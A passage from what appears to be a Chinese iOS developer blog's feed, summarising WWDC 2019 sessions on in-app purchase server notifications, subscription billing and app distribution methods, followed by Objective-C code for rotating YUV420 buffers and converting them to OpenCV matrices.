<code>storeProductNotAvailable</code>。这时购买行为也会被中断，你可给出一个弹窗之类的，告诉用户发生了什么。</p><h3 id="App-Pre-Orders"><a href="#App-Pre-Orders" class="headerlink" title="App Pre-Orders"></a>App Pre-Orders</h3><p>从 iOS 11.2、tvOS 11.2、macOS 10.13.2 开始，苹果推出预购应用的服务。开启预定的应用，在上架之前就可以上线产品介绍页，用户可以提前购买或者免费获取该应用。在最新版 App Store 中，“游戏” tab 会经常出现一个 “现可预定”分类，里面就是可预定中的游戏。</p><p>游戏行业有个运营的惯例是提前预约的用户在公测或正式上线后可以获得特殊奖励，提高玩家预定的积极性，从而在上线前造势。针对这类需求，苹果准备在应用的收据中添加预购相关的信息，用来判断当前用户是否预购应用，在旧版本的系统也将适用。</p><p>此外，在 watchOS 6.0 的手表应用商店中，也将支持应用预约。</p><h2 id="Server-to-Server-Notifications"><a href="#Server-to-Server-Notifications" class="headerlink" title="Server-to-Server Notifications"></a>Server-to-Server Notifications</h2><p>在用户为订阅的第一个周期付款后，可能发生什么事情呢？用户可能在 App Store 中取消掉自动订阅，可能在用户支持中申请了退款，可能把自动续费的开关关了又开，诸如此类的所有事件，我们是<strong>通通无法获知的</strong>，因为它们都是用户和苹果的交互，并非发生在 app 内部。除非我们定时对所有的订阅用户轮询，把验证收据接口都调一遍（通过验证收据可以获知齐全的订阅状态信息），这显然是不可能的，轮询频率过高负担太重，频率过低又失去了时效性。但是，它们对于用户订阅状态的维护又必不可少，因此，全面理解服务端对服务端通知这套机制，同时正确实现处理的逻辑，对于提供了订阅服务的产品<strong>十分重要</strong>。</p><h3 id="What-Are-Server-to-Server-Notifications"><a href="#What-Are-Server-to-Server-Notifications" class="headerlink" title="What Are Server-to-Server Notifications?"></a>What Are Server-to-Server Notifications?</h3><p>以前也被称为 <code>statusUpdateNotifications</code>，简单来说，就是你需要维护一台服务器，在 iTunes Connect 上填写好这台服务器的地址，并保持其稳定可用。当用户订阅的特定事件发生时，苹果就会把事件信息通过 HTTP POST JSON 的方式主动通知这台服务器。你需要为苹果的通知返回 200 的响应作为确认回执，异常情况下苹果会重发最多三次，同时，针对这些事件进行对应的业务逻辑处理。</p><h3 id="Setting-Up-Your-Server"><a href="#Setting-Up-Your-Server" class="headerlink" title="Setting Up Your Server"></a>Setting Up Your Server</h3><p>苹果对接收通知的服务器有以下几点的要求：</p><ol><li>请求的连接需要符合 ATS (App Transport Security)；</li><li>使用受信任证书颁发机构颁发的证书；</li><li>支持 TLS 1.2；</li><li>使用 AES-128 或 AES-256 对称加密；</li><li>使用 SHA-256 或更高级算法进行认证；</li></ol><h3 id="Unified-Receipt"><a href="#Unified-Receipt" class="headerlink" title="Unified Receipt"></a>Unified Receipt</h3><p>在之前，获取用户订阅信息只能通过<code>/verifyReceipt</code>收据验证接口获取。在以后的通知中，苹果对通知字段的结构进行了调整，添加了新字段<code>.unified_receipt</code>，包含内购的历史记录等与收据验证接口相同的信息。需要注意的是，不同于客户端从 bundle 中取出的收据，服务端对服务端通知里带的收据并不和某次应用的安装对应，因此，你只应该在服务端存储、处理通知中的收据。此字段将包含以下几个信息：</p><ul><li><code>lastest_receipt</code>：收据的唯一码，可用于收据验证接口。</li><li><code>lastest_receipt_info</code>：一个包含订阅信息和订阅者订阅情况的数组。</li><li><code>pending_renewal_info</code>：关于即将续订的信息。</li><li><code>status</code>：账单状态</li><li><code>environment</code>：账单创建的环境</li></ul><p>最多只包含最近100条记录，更多记录可以通过数据验证接口获取。</p><h3 id="Notification-Types"><a href="#Notification-Types" class="headerlink" title="Notification Types"></a>Notification Types</h3><p>在此之前，苹果提供了四种类型的通知：<code>INITIAL_BUY</code>、<code>INTERACTIVE_RENEWAL</code>、<code>DID_CHANGE_RENEWAL_PREF</code> 以及 <code>CANCEL</code>。它们发送的时机和字面意思一致，其中 <code>DID_CHANGE_RENEWAL_PREF</code> 是指自动续费订阅的级别发生变化（同一项订阅服务，可以分级别，例如基础版、高级版等）。<strong>对于用户订阅状态的维护，其实这四种通知已经可以满足需求</strong>，我们可以知晓用户初次订阅、用户更改了自动续费项目的级别、用户续费了、用户取消了订阅。  本次 WWDC 之后，苹果会再增加四种通知类型。分别是 <code>DID_CHANGE_RENEWAL_STATUS</code>、<code>DID_FAIL_TO_RENEW</code>、<code>DID_RECOVER</code>、<code>PRICE_INCREASE_CONSENT</code>，分别对应用户自动续费开关的更改、系统第一次自动续费失败、自动订阅失败过后再重试订阅成功以及用户进入了涨价流程。其中<code>PRICE_INCREASE_CONSENT</code>还包含了一个字段<code>price_increase_effective_date</code>，用于说明用户同意订阅价格变化的最后限期。</p><h3 id="Handling-Notifications"><a href="#Handling-Notifications" class="headerlink" title="Handling Notifications"></a>Handling Notifications</h3><p>这部分苹果举例了一个用户订阅的场景，过了一遍八种通知发出的时机，在此过程中详细讲解了每种通知你需要重点关注的字段，以及该如何处理。其中，<code>original_transaction_id</code>大家非常熟悉，也被演讲者频繁提到，它是一个用户订阅最初的交易 id，在每种通知中，你都可以使用这个字段去追溯这个交易。</p><p>需要注意的是，如果用户升级了一个订阅项目的级别，那么会收到对旧级别的 <code>CANCEL</code> 通知，以及对新级别的 <code>INTERACTIVE_RENEWAL</code> 通知。如果是自然流失之后再次订阅，则只会收到 <code>INTERACTIVE_RENEWAL</code> 通知。未来 <code>DID_RECOVER</code> 会替代<code>RENEWAL</code> 通知，但目前它们会同时收到，这是为了给你的服务一定的调整适应时间。</p><h3 id="利用新通知提升用户体验"><a href="#利用新通知提升用户体验" class="headerlink" title="利用新通知提升用户体验"></a>利用新通知提升用户体验</h3><p>用户在 App Store 对订阅项目进行的操作，以及在苹果用户支持系统中发起的退款等行为，都是用户和苹果进行的交互，我们的应用和后台服务无法及时感知，显得非常愚钝，因此这套通知系统的存在十分有必要。  总体来看，之前的四种通知，让这套通知系统达到了“可用”的水准，通过这四种通知类型，开发者可以方便地管理用户的订阅状态，然而，也仅仅是“可用”的水准。有了的新的四种通知类型，开发者可以关注到用户订阅行为更加详实的细节，对于用户的每一个操作，都能够及时感知，并且在应用内做出应对。举个例子，系统第一次自动续费失败，可能是用户无意间的操作导致付款方式失效。此刻我们的服务端收到了苹果的通知，然后下发一个提醒指令到客户端内，客户端在合适的时机用合适的方式提醒用户去检查一下付款方式，从而避免无意间的用户流失。可以看到，有了新的四种通知，我们可以把用户订阅的流程做到更好，提升了用户体验，也避免了不必要的流失。</p><h2 id="Subscription-Lifecycle"><a href="#Subscription-Lifecycle" class="headerlink" title="Subscription Lifecycle"></a>Subscription Lifecycle</h2><p>在这部分，苹果用细致又不繁琐的方式完整讲述了订阅行为的生命周期。大体上的过程如下：</p><ol><li><strong>Acquisition</strong>，通过试用等措施来吸引用户订阅你的服务；</li><li><strong>Engagement</strong>，你需要不断更新自己服务的内容让用户继续订阅你的服务；</li><li><strong>Retention</strong>，保持用户订阅量，减少流失。</li></ol><p>在此生命周期中，会穿插着许多账单相关的事件，例如：从试用到购买、服务升级或降级、续订或取消订阅等，通过上述八种通知类型，我们可以检测到这些事件发生，从而做出相应操作。在此session中，演讲者对各种通知对应的事件做了详细描述以及给出示例。</p><ol><li><p>Purchase，第一次订阅服务，应用收到此次购买的收据后，将相关信息加密传输到自己的服务器，服务器请求验证收据接口验证账单，并获取更多信息保存到数据库。服务器也会收到<code>INITIAL_BUY</code>通知，通知和账单信息的<code>original_transaction_id</code>一一对应。</p></li><li><p>Renewal，续订服务时，应用在下次启动时也会收到订阅收据，如果你不想等到下次启动也可以使用第一次购买的信息，然后把账单信息发送到服务器验证。这种事件服务器不会收到通知，服务器在收到应用发来的收据信息后，直接调用接口验证账单，然后提供相应服务即可。</p></li><li><p>Upgrade，升级订阅服务，服务会先收到一个旧服务的<code>CANCEL</code>通知，接下来会是<code>INTERACTIVE_RENEWAL</code>通知，服务器收到后可以去更新用户订阅信息，然后升级其服务。</p></li><li><p>Cancel，取消订阅，用户关闭自动续费的开关，在之前你可能需要对所有用户调用验证收据的接口去更新订阅信息，苹果对这种情况作出改变，新增<code>DID_CHANGE_RENEWAL_STATUS</code>通知，当用户改变续费状态时通知服务器，从而避免轮训用户的操作。</p></li><li><p>Churn，用户在订阅结束前，服务器没有收到任何关于他的通知，那么就可以把这名用户标记为流失用户。</p></li><li><p>Win Back，为了挽回流失用户，可以实行订阅优惠等措施，苹果把这单独作为一个Session，<a href="https://developer.apple.com/videos/play/wwdc2019/305/" target="_blank" rel="noopener">Session 305: 订阅优惠最佳实践</a></p></li><li><p>Billing Error，用户本来没有想着取消订阅，但是 App Store 无法恢复或续订，可能是用户的信用卡出现异常了，这种情况下，苹果会发出一个新的通知<code>DID_FAIL_TO_RENEW</code>。当你收到这个通知时，可以停止提供服务，标记流失用户，并在应用上面提醒用户订阅已经失效。</p></li><li><p>Billing Retry，在上面的情况下，App Store会自动尝试续订服务，如果成功了，将会发出新的通知<code>DID_RECOVER</code>， 服务器可以更新用户订阅信息，并重新提供相应服务。</p></li></ol><h2 id="Reducing-Involutary-Churns（减少无意间的用户流失）"><a href="#Reducing-Involutary-Churns（减少无意间的用户流失）" class="headerlink" title="Reducing Involutary Churns（减少无意间的用户流失）"></a>Reducing Involutary Churns（减少无意间的用户流失）</h2><p>这一节主要介绍苹果在帮助我们减少无意间的用户流失所做的措施和成果，包括不断优化和更新续订失败时的重试机制等，甚至使用了机器学习的模型来提升多平台恢复订阅的可能性。通过这次措施，苹果恢复了 77.4% 因为账单问题导致的订阅流失，从而将无意间的账单流失减少至 1.6%，恢复订阅数约 4600万。据数据统计，挽回的订阅数在前 16 天可达到 80%，那么我们在这期间可以做什么？那就是下一节的账单缓冲期。</p><h2 id="Billing-Grace-Period（账单缓冲期）"><a href="#Billing-Grace-Period（账单缓冲期）" class="headerlink" title="Billing Grace Period（账单缓冲期）"></a>Billing Grace Period（账单缓冲期）</h2><p>最后，介绍了一个压轴的新特性，叫做账单缓冲期（Billing Grace Period）。开发者可以自己选择是否开启这个特性，开启后，用户的自动订阅失效后会进入一定时间的缓冲期，苹果建议你在这段时间内保持对用户的服务（比如维持用户的会员状态），因为在这段时间里苹果可能还在持续地进行续费尝试。开启的步骤也很简单：</p><ol><li><p>在 App Store Connect 中选择开启服务；</p></li><li><p>在收据验证接口<code>/verifyReceipt</code>中，会有一新字段<code>grace_period_expires_date</code>，说明缓冲截止期；</p></li><li><p>在截止日期前，保持相应服务不中断。</p></li></ol><p>开启新账单缓冲期，可以减少对用户服务的干扰，账单可以维持在同一生命周期内，那么缓冲期也会算入长期订阅的 85/15 分成的时长中，从而给我们带来附加的收入，苹果强烈建议我们开启这个功能。</p><p>此外，你还可以利用这段时间在应用内为用户提供“最后的温存”，比如提醒用户你的会员你已经过期，但我对你的服务目前还会一如既往！用户极有可能在这段时间里被你挽回，重新安排上会员！</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://developer.apple.com/videos/play/wwdc2019/302/" target="_blank" rel="noopener">WWDC 2019 Session 302: In-App Purchases and Using Server-to-Server Notifications</a></li><li><a href="https://developer.apple.com/library/archive/documentation/NetworkingInternet/Conceptual/StoreKitGuide/Chapters/Subscriptions.html#//apple_ref/doc/uid/TP40008267-CH7-SW13" target="_blank" rel="noopener">In-App Purchase Programming Guide</a></li><li><a href="https://developer.apple.com/library/archive/releasenotes/General/ValidateAppStoreReceipt/Introduction.html#//apple_ref/doc/uid/TP40010573-CH105-SW1" target="_blank" rel="noopener">Receipt Validation Programming Guide</a></li><li><a href="https://developer.apple.com/documentation/storekit/in-app_purchase?language=objc" target="_blank" rel="noopener">In-App Purchase documents</a></li><li><a href="https://xiaozhuanlan.com/topic/0673452981" target="_blank" rel="noopener">内购新特性以及使用 server-to-server 通知</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Overview&quot;&gt;&lt;a href=&quot;#Overview&quot; class=&quot;headerlink&quot; title=&quot;Overview&quot;&gt;&lt;/a&gt;Overview&lt;/h2&gt;&lt;p&gt;本章节包括以下内容：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用新属性 &lt;code&gt;SKStorefro
      
    
    </summary>
    
    
    
      <category term="WWDC" scheme="http://xsenyu.github.io/tags/WWDC/"/>
    
  </entry>
  
  <entry>
    <title>WWDC 2019 Section 304 -- App Distribution – From Ad-hoc to Enterprise</title>
    <link href="http://xsenyu.github.io/2019/07/25/WWDC%202019%20Section%20304-%20App%20Distribution%20%E2%80%93%20From%20Ad-hoc%20to%20Enterprise/"/>
    <id>http://xsenyu.github.io/2019/07/25/WWDC%202019%20Section%20304-%20App%20Distribution%20%E2%80%93%20From%20Ad-hoc%20to%20Enterprise/</id>
    <published>2019-07-25T06:42:00.000Z</published>
    <updated>2020-04-06T09:17:23.703Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>一个应用的诞生大致经过以下历程：</p><blockquote><p>(Idea)想法诞生 –&gt; (Prototype)原型设计 –&gt; (App)应用实体 –&gt; (Users)用户使用</p></blockquote><p>你为了解决某个问题而产生想法，设计了应用的基本样式和页面交互等，然后把原型转换成真正的App，最后给用户使用，本 section 聚焦在最后一个环节，结合应用发布的四个途径，描述如何用最合适的方法将开发好的应用交付到用户使用。</p><h2 id="Distribution-Methods"><a href="#Distribution-Methods" class="headerlink" title="Distribution Methods"></a>Distribution Methods</h2><p>应用发布总共有四种途径：<code>Ad Hoc</code>、<code>App Store</code>、<code>In-House</code>、<code>Custom Apps</code></p><p><img src="https://upload-images.jianshu.io/upload_images/4881420-47ffa9df422f9dc1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="distribution_methods.png"></p><p>关于途径的选择，你需要考虑很多问题。应用的受众是谁？谁会购买你的应用？应用的归属是谁？应用发布面向的设备是谁持有的？源码的所有权属于谁？编译应用的工作谁负责？需要开发者账号的是谁？归根结底，就是需要明确应用的使用者是谁。</p><p><img src="https://upload-images.jianshu.io/upload_images/4881420-58b0e23578a64848.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="user.png"></p><p>苹果将应用的使用者归类为个人用户和群体用户，面向个人的用户可以选择 <code>Ad Hoc</code> 和 <code>App Store</code>，其中 <code>Ad Hoc</code> 是受限制的私有途径，主要限制了使用者数量和设备，而 <code>App Store</code> 则是四种途径中唯一一个公开的应用发布途径，面向所有个人用户，因此需要经过苹果严格的审核才得以发布。面向群体用户，比方说是一个企业里的员工，可以选择 <code>In-House</code> 和 <code>Custom Apps</code> 的方式发布应用，这两种都是私有的途径。在不同阶段的应用发布可能需要选择不同途径，这就需要你明白应用的预期效果和最优方案，选择最合适你的应用使用场景的途径。在这里苹果通过一个真实的应用例子讲述选择不同途径的情况。</p><h3 id="Ad-Hoc-Distribution"><a href="#Ad-Hoc-Distribution" class="headerlink" title="Ad Hoc Distribution"></a>Ad Hoc Distribution</h3><p>在完成 App 开发，准备进行发布之前，我们都希望 App 能在周围的同事之间先进行测试，提提意见，修改完善之后再发布到 <code>App Store</code> 上。另外，我们应用可能使用了类似 <code>CloudKit</code>、<code>APNS</code> 等不能通过调试测试的功能，但是又希望能测试到这些功能。Apple 考虑到这些问题，通过 <code>Ad Hoc</code> 来实现发布前的用户测试。使用 <code>Ad Hoc</code> 发布非常简单，配置好 <code>Ad Hoc</code> 证书后打包导出ipa，就可以给别人安装了。但是使用 <code>Ad Hoc</code> 是有限制的，使用 App 的设备需要在开发者账号上注册，一个账号每年最多只能注册100台设备。关于 <code>Ad Hoc</code> 的要点大致如下：</p><ul><li>用于在已注册的设备上进行测试；</li><li>短期发布的解决方案；</li><li>发布的应用不可长期使用，过期后将无法使用；</li><li>设备限制每年都会重置一次；</li></ul><p>随着测试的规模扩大，<code>Ad Hoc</code> 发布的方法将不能满足需求，一方面是手动添加设备UDID的过程比较耗费时间，另一方面测试设备数量的限制也会限制测试规模的扩大。这时候可以使用 <code>TestFlight</code> 来扩大 Beta 测试的规模。</p><p><img src="https://upload-images.jianshu.io/upload_images/4881420-9845857f683a1148.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="testflight.png"></p><p><code>TestFlight</code> 有分内部测试（Internal Testing）和外部测试（External Testing），内部测试 app 不需要经过审核，只要上传即可，但是只能邀请被添加到团队的成员参加，而且最多只能添加25人。而公测是需要审核的，不过只需要知道对方的邮箱即可发送邀请，而且最多可以邀请10000人。<code>TestFlight</code> 发布的一个版本有效期最多只有90天。</p><h3 id="Submitting-to-App-Store"><a href="#Submitting-to-App-Store" class="headerlink" title="Submitting to App Store"></a>Submitting to App Store</h3><p>在完成 Beta 测试后，你对 App 提炼出符合更多用户使用的特性，接下来可以准备宣传的资料、演示视频等，就可以准备上架 <code>App Store</code>，向外发布你的应用了。 <code>App Store</code> 上架的应用面向你选择的商店的所有用户，应用的审核和管理由 Apple 完成，因此你需要了解并遵循 <code>App Store</code> 的审核准则，确保你的应用适合大众使用，并不断更新应用以适配新的设备和系统。</p><h3 id="In-House-Distribution"><a href="#In-House-Distribution" class="headerlink" title="In-House Distribution"></a>In-House Distribution</h3><p><img src="https://upload-images.jianshu.io/upload_images/4881420-49703b125353def7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="in_house.png"></p><p>针对企业内部应用，Apple 提供了 <code>In-House Distribution</code> 途径，让你可以完全控制应用发布的整个流程。企业自身拥有并维护应用的源码，不需要上传到 App Store，借助移动设备管理系统（MDM），就可以完全在企业内部完成应用开发到发布使用的整个过程。</p><p><code>In-House</code> 发布方式要求应用的使用者都是企业内部人员，使用 <code>In-House</code> 发布的应用要求设备可以联网，所以无法连接外网的设备可能无法使用。因为应用整个流程都是企业掌控，不能依托 <code>TestFlight</code>等工具，所以对于应用的测试和管理需要企业自行处理好。<code>In-House</code> 所使用的发布证书需要妥善保管，证书有效期只有三年，<code>Provision Profile</code> 有效期只有一年，所以要管理好证书生命周期，及时发布证书更新的应用版本，以免出现过期等情况导致应用失效。如果需要出于某些原因需要撤销证书，那么使用该证书发布的应用会马上失效，企业需要重新签名和发布应用，否则会可能出现非常糟糕的情况。</p><h3 id="Custom-Apps"><a href="#Custom-Apps" class="headerlink" title="Custom Apps"></a>Custom Apps</h3><p><code>Custom Apps</code> 也是私有的发布途径，主要使用于企业对企业提供定制化的应用服务，负责开发的一方可以在不提供源码的情况下直接提供可购买的 App 给请求开发的一方使用。另外还可以是企业为自己提供，应用可由企业自己开发并在自己的账号上发布。</p><p><code>Custom Apps</code> 属于苹果开发者计划（Apple Developer Program）的一部分，依托 <code>Apple Business Manager</code> 进行管理。此前 <code>Custom Apps</code> 只可用于企业为企业提供定制化应用服务，现在也可以像 <code>In-House</code> 那样企业为自己提供服务，你可以给你的合作伙伴、客户、加盟商、内部员工、分公司等提供应用，通过 MDM 或兑现码分发许可证。</p><p><code>Custom Apps</code> 可在一个平台上管理内部和外部的所有应用，发布的应用没有使用期限，不用担心过期的问题。<code>In-House</code> 发布的应用只能提供给企业内部员工使用，而 <code>Custom Apps</code> 则可以提供给分公司等更多人一起使用。 <code>Custom Apps</code> 本身设定是企业对企业提供服务，因此对于寻求第三方软件服务支持的企业来说，他们无需访问源码就可以获得已发布好的应用，也不需要对应用的二进制包进行重签名等操作。另外，你可以使用 <code>App Store</code> 提供的不断更新的基础设施服务，比如说支付系统、<code>App Thining</code>、<code>TestFlight</code> 和 <code>App Store Connect</code> 工具等特性。</p><p><code>Custom Apps</code> 要求购买应用的用户需要有一个 <code>Apple Businsess Manager</code> 账号，应用需要支持和适配好其选择发布的国家，最好支持所有的国家。如果使用兑换码购买应用，需要确保兑换码只会给到特定的用户，因为兑换码只能在对应企业内可用。<code>Custom Apps</code> 需要经过审核，审核要求可以访问应用所有的功能，审核通过发布后，不能再提交到 <code>App Store</code> 作为公开应用。</p><p><img src="https://upload-images.jianshu.io/upload_images/4881420-0392d6d8167db2b0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="custom_apps.png"></p><p>Apple 在此环节还描述了如何使用 <code>Custom Apps</code> 发布应用，以及出现问题后解决的几个思路，详情可见视频或官方文档。</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>综上所述，关于选择途径，主要是根据应用的使用者是对外还是内部进行选择，<code>Ad Hoc</code> 可供内部测试时发布使用，<code>App Store</code> 用于对公众发布，<code>In-House</code> 和 <code>Custom Apps</code> 用于私有应用发布使用。<code>Ad Hoc</code> 途径一般只适用于 Beta 测试，针对发布正式应用的途径选择，Apple 总结成一下表格：</p><table><thead><tr><th>使用场景</th><th>App Store</th><th>In-House</th><th>Custom Apps</th></tr></thead><tbody><tr><td>面向公众</td><td>☑️</td><td></td><td></td></tr><tr><td>不愿向企业提供知识产权</td><td>☑️</td><td></td><td>☑️</td></tr><tr><td>企业没有 MDM</td><td></td><td></td><td>☑️</td></tr><tr><td>被雇佣作为应用开发顾问</td><td>☑️</td><td></td><td>☑️</td></tr><tr><td>企业没有使用 Apple Business Manager</td><td></td><td>☑️</td><td></td></tr><tr><td>App 只面向内部员工</td><td></td><td>☑️</td><td>☑️</td></tr><tr><td>为自己的企业发布应用</td><td></td><td>☑️</td><td>☑️</td></tr></tbody></table><blockquote><p>Apps are like cannonballs, it is better to know where they are going before they deploy.</p></blockquote><p>Apple 希望你的应用可以用最明智的方式发布应用，这就需要你考虑清楚你的客户和用户是谁、合理分配对应版本的应用、知道并了解苹果应用审核的准则，从而选出最合适的发布途径。</p><h2 id="Section-Video"><a href="#Section-Video" class="headerlink" title="Section Video"></a>Section Video</h2><p><a href="https://developer.apple.com/videos/play/wwdc2019/304/" target="_blank" rel="noopener">WWDC 2019 Section 304: App Distribution – From Ad-hoc to Enterprise</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Overview&quot;&gt;&lt;a href=&quot;#Overview&quot; class=&quot;headerlink&quot; title=&quot;Overview&quot;&gt;&lt;/a&gt;Overview&lt;/h2&gt;&lt;p&gt;一个应用的诞生大致经过以下历程：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(Idea)想法诞
      
    
    </summary>
    
    
    
      <category term="WWDC" scheme="http://xsenyu.github.io/tags/WWDC/"/>
    
  </entry>
  
  <entry>
    <title>YUV420 图像旋转以及转换成 cv::Mat 方法</title>
    <link href="http://xsenyu.github.io/2019/06/12/YUV420%20%E5%9B%BE%E5%83%8F%E6%97%8B%E8%BD%AC%E4%BB%A5%E5%8F%8A%E8%BD%AC%E6%8D%A2%E6%88%90%20opencv%20Mat%20%E6%96%B9%E6%B3%95/"/>
    <id>http://xsenyu.github.io/2019/06/12/YUV420%20%E5%9B%BE%E5%83%8F%E6%97%8B%E8%BD%AC%E4%BB%A5%E5%8F%8A%E8%BD%AC%E6%8D%A2%E6%88%90%20opencv%20Mat%20%E6%96%B9%E6%B3%95/</id>
    <published>2019-06-12T09:07:00.000Z</published>
    <updated>2020-04-06T11:11:17.595Z</updated>
    
    <content type="html"><![CDATA[<h3 id="旋转"><a href="#旋转" class="headerlink" title="旋转"></a>旋转</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; rotateConstant: 0 - 0°，1 - 90°，2 - 180°，3 - 270°</span><br><span class="line">- (CVPixelBufferRef)rotateBuffer:(CVPixelBufferRef)imageBuffer withConstant:(uint8_t)rotationConstant &#123;</span><br><span class="line">    vImage_Error err &#x3D; kvImageNoError;</span><br><span class="line">    CVPixelBufferLockBaseAddress(imageBuffer, 0);</span><br><span class="line">    size_t width &#x3D; CVPixelBufferGetWidth(imageBuffer);</span><br><span class="line">    size_t height &#x3D; CVPixelBufferGetHeight(imageBuffer);</span><br><span class="line">    size_t outHeight &#x3D; width;</span><br><span class="line">    size_t outWidth &#x3D; height;</span><br><span class="line"></span><br><span class="line">    assert(CVPixelBufferGetPixelFormatType(imageBuffer) &#x3D;&#x3D; kCVPixelFormatType_420YpCbCr8BiPlanarFullRange);</span><br><span class="line">    assert(CVPixelBufferGetPlaneCount(imageBuffer) &#x3D;&#x3D; 2); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; create buffer</span><br><span class="line">    CVPixelBufferRef rotatedBuffer &#x3D; NULL;</span><br><span class="line">    CVPixelBufferCreate(kCFAllocatorDefault, outWidth, outHeight, kCVPixelFormatType_420YpCbCr8BiPlanarFullRange, NULL, &amp;rotatedBuffer);</span><br><span class="line">    CVPixelBufferLockBaseAddress(rotatedBuffer, 0);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; rotate Y plane</span><br><span class="line">    vImage_Buffer originalYBuffer &#x3D; &#123; CVPixelBufferGetBaseAddressOfPlane(imageBuffer, 0), CVPixelBufferGetHeightOfPlane(imageBuffer, 0),</span><br><span class="line">        CVPixelBufferGetWidthOfPlane(imageBuffer, 0), CVPixelBufferGetBytesPerRowOfPlane(imageBuffer, 0) &#125;;</span><br><span class="line">    vImage_Buffer rotatedYBuffer &#x3D; &#123; CVPixelBufferGetBaseAddressOfPlane(rotatedBuffer, 0), CVPixelBufferGetHeightOfPlane(rotatedBuffer, 0),</span><br><span class="line">        CVPixelBufferGetWidthOfPlane(rotatedBuffer, 0), CVPixelBufferGetBytesPerRowOfPlane(rotatedBuffer, 0) &#125;;</span><br><span class="line">    err &#x3D; vImageRotate90_Planar8(&amp;originalYBuffer, &amp;rotatedYBuffer, rotationConstant, 0.0, kvImageNoFlags);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; rotate UV plane</span><br><span class="line">    vImage_Buffer originalUVBuffer &#x3D; &#123; CVPixelBufferGetBaseAddressOfPlane(imageBuffer, 1), CVPixelBufferGetHeightOfPlane(imageBuffer, 1),</span><br><span class="line">        CVPixelBufferGetWidthOfPlane(imageBuffer, 1), CVPixelBufferGetBytesPerRowOfPlane(imageBuffer, 1) &#125;;</span><br><span class="line">    vImage_Buffer rotatedUVBuffer &#x3D; &#123; CVPixelBufferGetBaseAddressOfPlane(rotatedBuffer, 1), CVPixelBufferGetHeightOfPlane(rotatedBuffer, 1),</span><br><span class="line">    CVPixelBufferGetWidthOfPlane(rotatedBuffer, 1), CVPixelBufferGetBytesPerRowOfPlane(rotatedBuffer, 1) &#125;;</span><br><span class="line">    err &#x3D; vImageRotate90_Planar16U(&amp;originalUVBuffer, &amp;rotatedUVBuffer, rotationConstant, 0.0, kvImageNoFlags);</span><br><span class="line"></span><br><span class="line">    CVPixelBufferUnlockBaseAddress(imageBuffer, 0);</span><br><span class="line">    CVPixelBufferUnlockBaseAddress(rotatedBuffer, 0);</span><br><span class="line"></span><br><span class="line">    return rotatedBuffer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="转换为-cv-Mat-格式"><a href="#转换为-cv-Mat-格式" class="headerlink" title="转换为 cv::Mat 格式"></a>转换为 cv::Mat 格式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">+ (Mat)matFromImageBuffer: (CVPixelBufferRef)pixelBuffer &#123;</span><br><span class="line">    CVPixelBufferLockBaseAddress(pixelBuffer, 0);</span><br><span class="line">    </span><br><span class="line">    void *baseaddress &#x3D; CVPixelBufferGetBaseAddressOfPlane(pixelBuffer, 0);</span><br><span class="line">    int bufferWidth &#x3D; (int)CVPixelBufferGetWidthOfPlane(pixelBuffer,0);</span><br><span class="line">    int bufferHeight &#x3D; (int)CVPixelBufferGetHeightOfPlane(pixelBuffer, 0);</span><br><span class="line"></span><br><span class="line">    cv::Mat converted;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get the yPlane (Luma values)</span><br><span class="line">    cv::Mat yPlane &#x3D; cv::Mat(bufferHeight, bufferWidth, CV_8UC1, baseaddress);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get cbcrPlane (Chroma values)</span><br><span class="line">    int cbcrWidth &#x3D; 